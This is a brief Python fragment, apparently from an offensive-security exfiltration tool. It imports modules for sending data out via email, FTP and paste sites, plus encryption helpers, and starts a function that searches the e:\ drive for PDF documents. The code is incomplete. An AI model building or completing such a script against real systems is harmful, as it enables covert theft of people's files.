from _24_cryptor import encrypt, decrypt
from _25_email_exfil import outlook, plain_email
from _26_transmit_exfil import plain_ftp, transmit
from _27_paste_exfil import ie_paste, plain_paste
...
def find_docs(doc_type='.pdf'):
    for parent, _, filenames in os.walk('e:\\'):
